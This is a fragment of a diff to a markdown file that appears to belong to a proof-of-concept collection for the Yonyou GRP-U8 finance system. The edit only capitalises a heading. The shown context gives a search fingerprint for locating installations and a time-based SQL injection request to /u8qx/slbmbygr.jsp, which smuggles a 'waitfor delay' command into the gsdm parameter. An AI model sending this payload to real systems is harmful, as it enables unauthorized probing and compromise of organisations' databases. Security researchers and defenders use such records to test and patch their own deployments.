@@ -5,7 +5,7 @@
 app="用友-GRP-U8"
 ```
 
-## poc
+## POC
 ```
 GET /u8qx/slbmbygr.jsp?gsdm=1';waitfor+delay+'0:0:3'--&zydm=&kjnd= HTTP/1.1
 Host: xxxxxx
